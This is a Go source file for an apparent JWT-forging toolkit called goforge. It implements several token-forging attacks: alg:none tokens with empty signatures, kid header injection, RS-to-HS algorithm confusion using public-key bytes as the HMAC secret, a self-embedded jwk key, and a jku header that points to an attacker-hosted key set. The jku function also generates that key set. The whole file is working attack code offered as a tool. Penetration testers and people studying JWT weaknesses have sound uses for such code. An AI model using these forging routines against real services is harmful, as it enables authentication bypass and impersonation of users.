// Package forge implements the JWT forging strategies: classic HMAC signing,
// alg:none, kid injection, RS->HS confusion, and the jwk/jku attacks.
// Each function takes header+payload (maps) + Options and returns the token.
package forge

import (
	"crypto/rand"
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"goforge/internal/jwt"
)

// Options carries the forging parameters. Each function uses only the relevant
// fields (Key for HMAC/confusion, Kid for kid injection, etc.).
type Options struct {
	Key       string
	Alg       string
	Kid       string
	Publickey string
	JkuURL    string
}

func HMAC(header, body map[string]any, o Options) (string, error) {
	header["alg"] = o.Alg
	h, err := jwt.EncodeSegment(header)
	if err != nil {
		return "", err
	}
	p, err := jwt.EncodeSegment(body)
	if err != nil {
		return "", err
	}
	sig, err := jwt.SignHMAC(h, p, o.Key, o.Alg)
	if err != nil {
		return "", err
	}
	return h + "." + p + "." + sig, nil
}

func None(header, body map[string]any, o Options) (string, error) {
	header["alg"] = o.Alg
	h, err := jwt.EncodeSegment(header)
	if err != nil {
		return "", err
	}
	p, err := jwt.EncodeSegment(body)
	if err != nil {
		return "", err
	}
	return h + "." + p + ".", nil // empty signature
}

func Kid(header, body map[string]any, o Options) (string, error) {
	header["kid"] = o.Kid
	header["alg"] = o.Alg
	h, err := jwt.EncodeSegment(header)
	if err != nil {
		return "", err
	}
	p, err := jwt.EncodeSegment(body)
	if err != nil {
		return "", err
	}
	sig, err := jwt.SignHMAC(h, p, o.Key, o.Alg)
	if err != nil {
		return "", err
	}
	return h + "." + p + "." + sig, nil
}

func Confusion(header, body map[string]any, o Options) (string, error) {
	origAlg, _ := header["alg"].(string)
	hsAlg, err := confusionTarget(origAlg)
	if err != nil {
		return "", err
	}
	header["alg"] = hsAlg
	h, err := jwt.EncodeSegment(header)
	if err != nil {
		return "", err
	}
	p, err := jwt.EncodeSegment(body)
	if err != nil {
		return "", err
	}
	sig, err := jwt.SignHMAC(h, p, o.Key, hsAlg) // bytes of the public key
	if err != nil {
		return "", err
	}
	return h + "." + p + "." + sig, nil
}

func confusionTarget(alg string) (string, error) {
	switch alg {
	case "RS256", "ES256", "PS256":
		return "HS256", nil
	case "RS384", "ES384", "PS384":
		return "HS384", nil
	case "RS512", "ES512", "PS512":
		return "HS512", nil
	default:
		return "", fmt.Errorf("confusion needs an asymetric token, got %s", alg)
	}
}

// signRS256 encodes the header and payload then signs them in RS256 with priv,
// returning the full token. Factors out the part common to JWK and JKU.
func signRS256(header, body map[string]any, priv *rsa.PrivateKey) (string, error) {
	h, err := jwt.EncodeSegment(header)
	if err != nil {
		return "", err
	}
	p, err := jwt.EncodeSegment(body)
	if err != nil {
		return "", err
	}
	sig, err := jwt.SignRSA(h, p, priv)
	if err != nil {
		return "", err
	}
	return h + "." + p + "." + sig, nil
}

// JWK forges a token whose header embeds a self-generated public key (the "jwk"
// field), signed in RS256 with the matching private key. A server that trusts
// the token's "jwk" will accept the signature.
func JWK(header, body map[string]any, o Options) (string, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", fmt.Errorf("generate rsa key: %w", err)
	}
	header["alg"] = "RS256"
	header["jwk"] = jwt.PublicKeyToJWK(&priv.PublicKey)
	return signRS256(header, body, priv)
}

// JKU forges a token whose header points (the "jku" field) to an attacker-
// controlled URL, signed in RS256. Also returns the JWKS to host at that URL
// (JSON {"keys":[...]}) so that server-side verification succeeds.
func JKU(header, body map[string]any, o Options) (string, string, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", "", fmt.Errorf("generate rsa key: %w", err)
	}
	kid := "goforge"
	header["alg"] = "RS256"
	header["jku"] = o.JkuURL
	header["kid"] = kid

	token, err := signRS256(header, body, priv)
	if err != nil {
		return "", "", err
	}

	jwk := jwt.PublicKeyToJWK(&priv.PublicKey)
	jwk["kid"] = kid
	jwk["use"] = "sig"
	jwk["alg"] = "RS256"
	jwksBytes, err := json.MarshalIndent(map[string]any{"keys": []any{jwk}}, "", "  ")
	if err != nil {
		return "", "", err
	}
	return token, string(jwksBytes), nil
}
